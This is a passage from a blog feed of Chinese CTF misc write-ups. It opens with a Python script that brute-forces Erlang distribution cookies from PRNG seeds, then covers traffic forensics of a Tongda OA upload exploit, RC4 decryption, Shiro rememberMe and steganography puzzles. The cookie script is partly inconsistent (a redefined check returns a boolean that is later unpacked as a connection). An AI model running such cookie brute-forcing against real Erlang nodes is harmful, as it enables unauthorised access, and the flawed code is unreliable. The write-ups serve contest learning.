class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> asyncio</span><br><span class="line"><span class="keyword">from</span> erldp <span class="keyword">import</span> authenticate</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> islice</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">authenticate</span>(<span class="params">cookie_bytes, challenge</span>):</span><br><span class="line">  md5_hash = hashlib.md5()</span><br><span class="line">  md5_hash.update(cookie_bytes)</span><br><span class="line">  md5_hash.update(<span class="built_in">str</span>(challenge).encode())</span><br><span class="line">  digest = md5_hash.hexdigest()</span><br><span class="line">  <span class="keyword">return</span> digest == <span class="string">&quot;f0e2967976d3ad1d0e8d2e85e7146f1a&quot;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_interval</span>(<span class="params">arg</span>):</span><br><span class="line">  elms = arg.split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">  <span class="keyword">assert</span>(<span class="built_in">len</span>(elms) == <span class="number">3</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">int</span>(elms[<span class="number">0</span>], <span class="number">0</span>), <span class="built_in">int</span>(elms[<span class="number">1</span>], <span class="number">0</span>), <span class="built_in">float</span>(elms[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_distribution</span>(<span class="params">arg</span>):</span><br><span class="line">  intervals = []</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(arg, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    obj = json.load(f)</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> obj:</span><br><span class="line">      <span class="keyword">assert</span>(<span class="string">&#x27;start&#x27;</span> <span class="keyword">in</span> item)</span><br><span class="line">      <span class="keyword">assert</span>(<span class="string">&#x27;stop&#x27;</span> <span class="keyword">in</span> item)</span><br><span class="line">      <span class="keyword">assert</span>(<span class="string">&#x27;prob&#x27;</span> <span class="keyword">in</span> item)</span><br><span class="line">      intervals.append((item[<span class="string">&#x27;start&#x27;</span>], item[<span class="string">&#x27;stop&#x27;</span>], item[<span class="string">&#x27;prob&#x27;</span>]))</span><br><span class="line">  <span class="keyword">return</span> intervals</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">walk_intervals</span>(<span class="params">intervals</span>):</span><br><span class="line">  <span class="keyword">for</span> (start, stop, prob) <span class="keyword">in</span> <span class="built_in">sorted</span>(intervals, key=<span class="keyword">lambda</span> x: x[<span class="number">2</span>], reverse=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(start, stop):</span><br><span class="line">      <span class="keyword">yield</span> x</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">next_random</span>(<span class="params">x</span>): <span class="keyword">return</span> (x*<span class="number">17059465</span> + <span class="number">1</span>) &amp; <span class="number">0xfffffffff</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">derive_cookie</span>(<span class="params">seed, size</span>):</span><br><span class="line">  x = seed</span><br><span class="line">  cookie = <span class="built_in">bytearray</span>(<span class="string">b&#x27;0&#x27;</span>*size)</span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(size-<span class="number">1</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">    x = next_random(x)</span><br><span class="line">    cookie[i] = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>) + ((<span class="number">26</span>*x) // <span class="number">0x1000000000</span>)</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">bytes</span>(cookie)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">batched</span>(<span class="params">iterable, n</span>):</span><br><span class="line">  <span class="string">&quot;Batch data into tuples of length n. The last batch may be shorter.&quot;</span></span><br><span class="line">  <span class="comment"># batched(&#x27;ABCDEFG&#x27;, 3) --&gt; ABC DEF G</span></span><br><span class="line">  <span class="keyword">if</span> n &lt; <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">raise</span> ValueError(<span class="string">&#x27;n must be at least one&#x27;</span>)</span><br><span class="line">  it = <span class="built_in">iter</span>(iterable)</span><br><span class="line">  <span class="keyword">while</span> batch := <span class="built_in">tuple</span>(islice(it, n)):</span><br><span class="line">    <span class="keyword">yield</span> batch</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">derive_and_authenticate</span>(<span class="params">seed, challenge</span>):</span><br><span class="line">  cookie = derive_cookie(seed, <span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">  success = authenticate(cookie,challenge)</span><br><span class="line">  <span class="keyword">if</span> success:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;[*] seed=<span class="subst">&#123;seed:#x&#125;</span> cookie=<span class="subst">&#123;cookie.decode()&#125;</span>&#x27;</span>)</span><br><span class="line">    (r, w) = success</span><br><span class="line">    w.close()</span><br><span class="line">    <span class="keyword">await</span> w.wait_closed()</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">amain</span>(<span class="params">intervals, sim, target, port</span>):</span><br><span class="line">  <span class="keyword">for</span> seeds <span class="keyword">in</span> batched(walk_intervals(intervals), sim):</span><br><span class="line">    tasks = [asyncio.create_task(derive_and_authenticate(seed, <span class="number">0x60ea7bde</span>)) <span class="keyword">for</span> seed <span class="keyword">in</span> seeds]</span><br><span class="line">    <span class="keyword">await</span> asyncio.gather(*tasks)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  <span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">  parser = argparse.ArgumentParser()</span><br><span class="line">  mutual = parser.add_mutually_exclusive_group(required=<span class="literal">True</span>)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--interval&#x27;</span>, action=<span class="string">&#x27;append&#x27;</span>, <span class="built_in">type</span>=parse_interval)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--distribution&#x27;</span>)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--seed-full-space&#x27;</span>, action=<span class="string">&#x27;store_true&#x27;</span>)</span><br><span class="line">  mutual.add_argument(<span class="string">&#x27;--sim&#x27;</span>, default=<span class="number">16</span>, <span class="built_in">type</span>=<span class="built_in">int</span>)</span><br><span class="line">  parser.add_argument(<span class="string">&#x27;target&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&#x27;Erlang node address or FQDN&#x27;</span>)</span><br><span class="line">  parser.add_argument(<span class="string">&#x27;port&#x27;</span>, action=<span class="string">&#x27;store&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">int</span>, <span class="built_in">help</span>=<span class="string">&#x27;Erlang node TCP port&#x27;</span>)</span><br><span class="line"></span><br><span class="line">  args = parser.parse_args()</span><br><span class="line">  <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> args.seed_full_space:</span><br><span class="line">    intervals = [parse_interval(<span class="string">&#x27;300000000,500000000,1000&#x27;</span>)]</span><br><span class="line">  <span class="keyword">elif</span> args.distribution:</span><br><span class="line">    intervals = parse_distribution(args.distribution)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    intervals = args.interval</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">  asyncio.run(amain(intervals, args.sim, args.target, args.port))</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>挂着跑一段时间即可得到结果</p><p><img src="/images/ByteCTF2024%E5%88%9D%E8%B5%9B-%E9%83%A8%E5%88%86Misc-%E5%A4%8D%E7%8E%B0/image-20240924000420546.png" alt="image-20240924000420546"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> Misc </tag>
            
            <tag> ByteCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>长城杯2024初赛 misc Writeup</title>
      <link href="/posts/5270d108/"/>
      <url>/posts/5270d108/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近打的所有比赛中，misc最简单的一次(</p><p>但是由于是两个misc手+一个re手组队，局限性可想而知。。。在这记录一下三道misc题</p></blockquote><h2 id="BrickGame"><a href="#BrickGame" class="headerlink" title="BrickGame"></a>BrickGame</h2><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908192223654.png" alt="image-20240908192223654"></p><p>直接玩通关即可</p><h2 id="漏洞探踪，流量解密"><a href="#漏洞探踪，流量解密" class="headerlink" title="漏洞探踪，流量解密"></a>漏洞探踪，流量解密</h2><h3 id="第一阶段"><a href="#第一阶段" class="headerlink" title="第一阶段"></a>第一阶段</h3><p>经过查看流量与在网上搜索，可以发现这是<a href="https://www.cnblogs.com/T0uch/p/12580789.html">通达OA的洞</a>。根据其原理，可以在给出的日志中搜索&#x2F;ispirit&#x2F;im&#x2F;upload.php，找到攻击来源ip，也就是第二阶段的压缩包的密码192.168.30.234</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908194622178.png" alt="image-20240908194622178"></p><h3 id="第二阶段"><a href="#第二阶段" class="headerlink" title="第二阶段"></a>第二阶段</h3><p>根据漏洞的原理，可以知道接下来是通过&#x2F;ispirit&#x2F;interface&#x2F;gateway.php路径的文件上传漏洞，我们直接在流量中过滤出用到这个路径的流</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908202627396.png" alt="image-20240908202627396"></p><p>其中有一个流可以看到提示，使用的是RC4加密</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908203255737.png" alt="image-20240908203255737"></p><p>还可以从此外的两个流中看到从192.168.1.5下载了一个叫做key的文件和一个叫做raw的文件，过滤出目标为192.168.1.5的流</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908203543604.png" alt="image-20240908203543604"></p><p>追踪，可以找到密钥和密文</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908203638605.png" alt="image-20240908203638605"></p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908203713316.png" alt="image-20240908203713316"></p><p>注意这里的密文前跟着密钥，删去以后解密即可得到flag</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908204010288.png" alt="image-20240908204010288"></p><h2 id="最安全的加密方式"><a href="#最安全的加密方式" class="headerlink" title="最安全的加密方式"></a>最安全的加密方式</h2><p>过滤http流，追踪一下，可以找到一个脚本和一个rar压缩包</p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908205114377.png" alt="image-20240908205114377"></p><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908205026982.png" alt="image-20240908205026982"></p><p>导出以后经过尝试，脚本中的pass就是rar压缩包的密码，解压得到大量的md5值。</p><img src="/images/长城杯2024初赛-misc-Writeup/image-20240908205742264.png" alt="image-20240908205742264" style="zoom:50%;" /><p>在cmd5上查了几行可以看出来，这是对flag进行了逐字符求md5值，写个脚本生成一个字典查询拼接即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_md5_dict</span>():</span><br><span class="line"></span><br><span class="line">    md5_dict = &#123;&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ascii_code <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line"></span><br><span class="line">        char = <span class="built_in">chr</span>(ascii_code)</span><br><span class="line">    </span><br><span class="line">        hash_object = hashlib.md5(char.encode())</span><br><span class="line">        md5_hash = hash_object.hexdigest()</span><br><span class="line">        md5_dict[md5_hash] = char</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> md5_dict</span><br><span class="line"></span><br><span class="line">md5_dict = generate_md5_dict()</span><br><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">while</span> a:</span><br><span class="line">    s+=md5_dict[a]</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line"><span class="built_in">print</span>(s)</span><br></pre></td></tr></table></figure><p><img src="/images/%E9%95%BF%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-misc-Writeup/image-20240908210036787.png" alt="image-20240908210036787"></p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 长城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>羊城杯2024初赛 Writeup</title>
      <link href="/posts/805e7875/"/>
      <url>/posts/805e7875/</url>
      
        <content type="html"><![CDATA[<h2 id="Writeup部分"><a href="#Writeup部分" class="headerlink" title="Writeup部分"></a>Writeup部分</h2><h4 id="Writeup"><a href="#Writeup" class="headerlink" title="Writeup"></a><a href="https://www.blog.st4rr.top/writeups/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024Writeup.pdf">Writeup</a></h4><p>Additional Statement:</p><p>written by <strong>X1cT34m</strong></p><h2 id="复现部分"><a href="#复现部分" class="headerlink" title="复现部分"></a>复现部分</h2><blockquote><p>个人感觉这次羊城杯的misc实在是有点需要脑洞了，做到最后真的是感到穷途末路了，根本不知道接下来应该往什么方向走。。。现在看了其他师傅的wp，感到有的地方确实挺脑洞，但还是有的地方是自己的技术不过关，要学的还有很多。</p></blockquote><h3 id="Checkin"><a href="#Checkin" class="headerlink" title="Checkin"></a>Checkin</h3><p>下载下来的压缩包有个注释，是base58编码</p><img src="/images/羊城杯2024初赛-Writeup/image-20240828232334149.png" alt="image-20240828232334149" style="zoom:50%;" /><img src="/images/羊城杯2024初赛-Writeup/image-20240828232441329.png" alt="image-20240828232441329" style="zoom:50%;" /><p>FLag.txt中明显是某个文件的十六进制形式，cyberchef用hex转出来导入010可以看出这是个pcapng文件</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828233209162.png" alt="image-20240828233209162"></p><blockquote><p>当时比赛的时候就是卡在这里了。。。结果没想到接下来的某个步骤其实正好是我最近研究过的一个东西。。。</p></blockquote><p>前面的FLag.txt其实还藏着一层wbstego隐写，密码就是上面zip中的注释</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828234413048.png" alt="image-20240828234413048"></p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828234524260.png" alt="image-20240828234524260"></p><p>一看就是SSLKEYLOGFILE，导入解密tls流量</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828235009581.png" alt="image-20240828235009581"></p><p>发现多出来的http流量中有个GIF，导出</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240828235420564.png" alt="image-20240828235420564"></p><p>简单写个脚本可以发现得到的gif帧与帧之间间隔时间有两种，0.3和2.3，分别对应0和1，得到的二进制串转文本即可得到flag</p><p>脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_gif_frames</span>(<span class="params">gif_file</span>):</span><br><span class="line">    im = Image.<span class="built_in">open</span>(gif_file)</span><br><span class="line">    im.seek(<span class="number">0</span>)</span><br><span class="line">    delay_times = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            delay_time = im.info.get(<span class="string">&#x27;duration&#x27;</span>, <span class="number">0</span>) / <span class="number">100.0</span></span><br><span class="line">            delay_times.append(delay_time)</span><br><span class="line">            im.seek(im.tell() + <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> EOFError:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> delay_times</span><br><span class="line">gif_file_path = <span class="string">&#x27;1.gif&#x27;</span></span><br><span class="line">delays = read_gif_frames(gif_file_path)</span><br><span class="line">s=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i, delay <span class="keyword">in</span> <span class="built_in">enumerate</span>(delays):</span><br><span class="line">    <span class="comment">#print(delay)</span></span><br><span class="line">    <span class="keyword">if</span> delay==<span class="number">0.3</span>:</span><br><span class="line">        s+=<span class="string">&#x27;0&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        s+=<span class="string">&#x27;1&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(s,<span class="number">2</span>)))</span><br></pre></td></tr></table></figure><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829003649950.png" alt="image-20240829003649950"></p><h3 id="miaoro"><a href="#miaoro" class="headerlink" title="miaoro"></a>miaoro</h3><p>追踪tcp流，不难发现，GWHT中是请求，后面$$$…$$$之间的是返回的结果。在tcp流13处可以找到有用的东西</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829114444805.png" alt="image-20240829114444805"></p><p>经过base64解码不难发现，这是一个倒置的zip文件</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829151126046.png" alt="image-20240829151126046"></p><p>写个脚本回复一下这个zip文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">f=<span class="built_in">open</span>(<span class="string">&#x27;download.txt&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">f.readline()</span><br><span class="line">f.readline()</span><br><span class="line">f.readline()</span><br><span class="line">raw=<span class="string">&#x27;&#x27;</span></span><br><span class="line">a=f.readline().strip()</span><br><span class="line"><span class="keyword">while</span> a[:<span class="number">4</span>]!=<span class="string">&#x27;c8d0&#x27;</span>:</span><br><span class="line">    raw+=a[-<span class="number">16</span>:]</span><br><span class="line">    a=f.readline().strip()</span><br><span class="line">raw+=<span class="string">&#x27;4030b405&#x27;</span></span><br><span class="line">raw=raw[::-<span class="number">1</span>]</span><br><span class="line">ff=<span class="built_in">open</span>(<span class="string">&#x27;1.zip&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(raw),<span class="number">2</span>):</span><br><span class="line">    ff.write(<span class="built_in">bytes</span>.fromhex(raw[j:j+<span class="number">2</span>]))</span><br></pre></td></tr></table></figure><p>发现需要密码，再回到流量包去找，最终在tcp流10的GWHT中找到压缩包密码</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829151721392.png" alt="image-20240829151721392"></p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829151737624.png" alt="image-20240829151737624"></p><p>解压出的图片看起来错位了，猜测是宽被修改过，这里将宽和高改成一样即可</p><img src="/images/羊城杯2024初赛-Writeup/image-20240829151911027.png" alt="image-20240829151911027" style="zoom:50%;" /><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829152017519.png" alt="image-20240829152017519"></p><p>得到的是猫猫编码，在网上可以找到[对照表](<a href="https://www.behance.net/gallery/76299757/CAT-font-alphabet?tracking_source=search_projects_recommended%7Ccat">https://www.behance.net/gallery/76299757/CAT-font-alphabet?tracking_source=search_projects_recommended|cat</a> alphabet)，对应着可以解出后半个flag：EBOFDELQDIAA}</p><img src="/images/羊城杯2024初赛-Writeup/image-20240829151911027.png" alt="image-20240829151911027" style="zoom:50%;" /><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829152017519.png" alt="image-20240829152017519"></p><p>得到的是猫猫编码，在网上可以找到<a href="https://www.behance.net/gallery/76299757/CAT-font-alphabet?tracking_source=search_projects_recommended%7Ccat%20alphabet">对照表</a>，对应着可以解出后半个flag：EBOFDELQDIAA}</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829152154193.png" alt="image-20240829152154193"></p><blockquote><p>比赛的时候卡在了这儿，怎么也找不到前半个flag。。。对shiro_attack还是不熟悉。。。</p></blockquote><p>既然这题考了shiro_attack，那肯定得有点shiro的东西。前半个flag其实就藏在shiro的rememberMe里面，在这题里面叫作nekoMiao。</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829153223632.png" alt="image-20240829153223632"></p><p>用工具解一下就可以看到前半个flag：DASCTF{B916CFEB-C40F-45D6-A7BC-</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829153349040.png" alt="image-20240829153349040"></p><h3 id="1z-misc"><a href="#1z-misc" class="headerlink" title="1z_misc"></a>1z_misc</h3><blockquote><p>这题感觉是最抽象的一题，上来纯属猜谜。。。难就难在需要的脑洞太大了。。。反正我是被这个猜谜困住了（T0T)</p></blockquote><p>题目</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">天地玄黄，宇宙洪荒；日月盈昃，辰宿列张；万物芸芸，息息相关；是以十二岁而行二十八宿，其间奥妙，待探寻，显真章。</span><br><span class="line">若女可为11，可为1124......觜可为91，亦可为725......如此往复，周而复始。</span><br><span class="line">祈解其秘：[43,101,55,16,16,1017,28,812,824,43,55,226,101,55,55,415,1017,1027,28,28,617,824,28,812,1027,16,101,16,55,1027,1017,28,16]</span><br></pre></td></tr></table></figure><p>另外还有一个压缩包</p><p>hint</p><img src="/images/羊城杯2024初赛-Writeup/e865c9738431f6d9b72e663f116f8dc.png" alt="e865c9738431f6d9b72e663f116f8dc" style="zoom:50%;" /><p>先来解释一下11和91。11的前一个1指的是地支的第一位子，后一个指的是子对应的三个星宿的第一位女；91的9指的是地支的第九位申，1指的是申对应的三个星宿的第一位觜。</p><p>再来解释一下1124和725。1124的11指的是地支的第十一位戌，24指的是从戌的第一位奎开始逆时针数二十四个正好到女；725的7指的是地支的第七位午，25指的是从午的第一位柳开始逆时针数25个正好到觜。</p><p>因此我们可以解密题目中给的数组，得到如下结果：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">心,胃,心,奎,奎,心,奎,心,胃,心,心,心,胃,心,心,胃,心,奎,奎,奎,奎,胃,奎,心,奎,奎,胃,奎,心,奎,心,奎,奎</span><br></pre></td></tr></table></figure><p>总共只有三种元素，很容易想到摩斯电码，其中，心为.，胃为&#x2F;，奎为-</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829161715362.png" alt="image-20240829161715362"></p><p>这就是解题目给的压缩包的密码，解压得到一张hint.jpg和一个不明二进制文件flag。用010查看flag，再结合hint.jpg中提示的天琴座，不难猜到这是lyra隐写，将flag改名为flag.lyra。</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF2024%E5%88%9D%E8%B5%9B-Writeup/image-20240829162759993.png" alt="image-20240829162759993"></p><p>后面的步骤跟ISCC2024的<a href="https://blog.csdn.net/administratorlws/article/details/139154964?ops_request_misc=%257B%2522request%255Fid%2522%253A%252239915FCB-333C-46C6-879E-240F264B325F%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=39915FCB-333C-46C6-879E-240F264B325F&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-139154964-null-null.142%5Ev100%5Epc_search_result_base4&utm_term=iscc%20%E6%9C%89%E4%BA%BA%E8%AE%A9%E6%88%91%E7%BB%99%E4%BD%A0%E5%B8%A6%E4%B8%AA%E8%AF%9D&spm=1018.2226.3001.4187">有人让我给你带个话</a>这题是一样的，由于<a href="https://blog.csdn.net/qq_36959443/article/details/116136965">lyra工具的安装</a>有点困难，我目前没安装成功，就先不复现下去了(T0T)，以后再用到的时候再研究吧</p><p>flag: DASCTF{W0w!_You_d0_4_g00d_j0b!}</p>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Writeup </tag>
            
            <tag> CTF </tag>
            
            <tag> 羊城杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NepCTF2024 Writeup</title>
      <link href="/posts/cebc5081/"/>
      <url>/posts/cebc5081/</url>
      
